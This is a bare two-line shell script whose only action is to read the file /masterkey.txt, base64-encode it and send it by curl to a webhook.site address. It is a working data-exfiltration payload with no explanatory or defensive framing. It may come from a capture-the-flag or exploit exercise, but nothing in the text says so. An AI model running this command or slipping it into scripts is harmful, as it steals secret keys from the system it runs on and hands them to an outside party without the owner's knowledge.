#!/bin/sh
curl https://webhook.site/3ba5e3bf-68ba-44d7-871d-6a744af34bb8/$(cat /masterkey.txt | base64)
